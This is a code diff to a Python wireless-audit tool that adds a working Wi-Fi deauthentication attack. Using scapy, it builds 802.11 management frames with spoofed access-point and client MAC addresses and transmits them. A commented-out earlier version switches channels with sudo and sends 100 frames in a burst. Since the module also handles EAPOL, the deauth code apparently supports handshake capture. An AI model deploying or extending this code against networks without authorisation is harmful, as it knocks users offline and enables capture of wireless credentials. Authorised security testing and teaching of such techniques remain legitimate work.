@@ -5,7 +5,7 @@ import threading
 from pathlib import Path
 from typing import List, Tuple, Any
 
-from scapy.all import Dot11, Dot11Elt, Dot11Beacon, RadioTap
+from scapy.all import Dot11, Dot11Elt, Dot11Beacon, RadioTap, Dot11Deauth
 from scapy.layers.eap import EAPOL
 from tabulate import tabulate
 
@@ -868,6 +868,118 @@ class WirelessAuditEngine:
             self.probe_results.append(row)
 
         self.render_probe_table()
+
+    # # this will be a deathentication attack module
+    # def deauth_frame(self, iface:str, channel: int, transmitter_mac: str, receiver_mac: str) -> bool:
+
+    #     # we don't need Dot11Deauth separately, as we'll use the Dot11
+    #     # and give type=0; subtype=12 (for a valid deauth frame)
+    #     from scapy.all import sendp, Dot11Deauth
+
+    #     # need to switch the channel to the AP's channel
+    #     # to be able to operate on the same frequency
+    #     import subprocess
+    #     channel_str = str(channel)
+    #     channel_switch = subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", channel_str], 
+    #         capture_output=True,
+    #         text=True
+    #     )
+
+    #     if channel_switch.returncode != 0:
+    #         print(f"[!] Unable to switch the channel: {channel_switch.stderr}")
+    #         import sys; sys.exit(1)
+
+    #     # set the RadioTap header
+    #     radio_tap = RadioTap()
+
+    #     # 802.11 Frame Header
+    #     # type=0 (Management Frame)
+    #     # subtype=12 (0x0C) Deauthentication Frame
+    #     # addr1: Receiver address (target)
+    #     # addr2: Transmitter address (Access Point or Client)
+    #     # addr3: BSSID (Access Point MAC)
+    #     dot11 = Dot11(type=0, subtype=12, addr1=receiver_mac, addr2=transmitter_mac, addr3=transmitter_mac)
+
+    #     # Set the reason code to 1 (unspecified reason)
+    #     # writing it in \x01\x00 instead of \x00\x01 due to little-endian (LSB)
+    #     # so \0x1\x00 won't be seen as 256 in decimal representation
+    #     # rather it'd be interpreter as \x00\x01 by the devices
+    #     # as the ieee 802.11 this bit is in little-endian format
+    #     # so it'd be seen as 1 not 256 !!!!
+    #     reason_code = b"\x01\x00"
+
+    #     # structure the frame
+    #     deauth_frame = radio_tap / dot11 / reason_code
+
+    #     # Send the frame
+    #     print(f"Sending raw deauth frames with reason code 1...")
+    #     sendp(deauth_frame, iface=iface, inter=0.1, count=100, verbose=0)
+
+    def deauth_frame(self, iface:str, transmitter_mac: str, receiver_mac: str) -> bool:
+
+        # we don't need Dot11Deauth separately, as we'll use the Dot11
+        # and give type=0; subtype=12 (for a valid deauth frame)
+        # from scapy.all import sendp, Dot11,  Dot11, Dot11Deauth
+        from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
+
+        # need to switch the channel to the AP's channel
+        # to be able to operate on the same frequency
+        # This thing will be in main.py
+        # I don't want it to keep changing channel continuosly every time this function get's called.
+        # Change only once.
+        # import subprocess
+        # channel_str = str(channel)
+        # channel_switch = subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", channel_str], 
+        #     capture_output=True,
+        #     text=True
+        # )
+
+        # if channel_switch.returncode != 0:
+        #     print(f"[!] Unable to switch the channel: {channel_switch.stderr}")
+        #     import sys; sys.exit(1)
+
+        # set the RadioTap header
+        # radio = RadioTap()
+
+        # # 802.11 Frame Header
+        # # type=0 (Management Frame)
+        # # subtype=12 (0x0C) Deauthentication Frame
+        # # addr1: Receiver address (target)
+        # # addr2: Transmitter address (Access Point or Client)
+        # # addr3: BSSID (Access Point MAC)
+        # dot11 = Dot11(addr1=receiver_mac, addr2=transmitter_mac, addr3=transmitter_mac)
+
+        # # Set the reason code to 1 (unspecified reason)
+        # # writing it in \x01\x00 instead of \x00\x01 due to little-endian (LSB)
+        # # so \0x1\x00 won't be seen as 256 in decimal representation
+        # # rather it'd be interpreter as \x00\x01 by the devices
+        # # as the ieee 802.11 this bit is in little-endian format
+        # # so it'd be seen as 1 not 256 !!!!
+        # # changed from using raw bytes to Dot11Deauth with reason code 1 or 7
+        # deauth = Dot11Deauth(reason=7)
+
+        # lemme try this way !!!
+        packet = (
+            RadioTap() /
+            Dot11(
+                type=0,
+                subtype=12,
+                addr1=receiver_mac,
+                addr2=transmitter_mac,
+                addr3=transmitter_mac,
+            ) /
+            Dot11Deauth(reason=7)
+        )
+
+        # structure the frame
+        # packet = radio / dot11 / deauth
+
+        # Send the frame
+        print(f"Sending raw deauth frames with reason code 1...")
+        # print(type(iface), iface)
+        # print(type(packet), packet.summary())
+        # changing the verbose to 0, so it doesn't look creepy !!!
+        sendp(packet, iface=iface, inter=0.1, count=1, verbose=0)
 
     def render_probe_table(self):
         display_rows = []
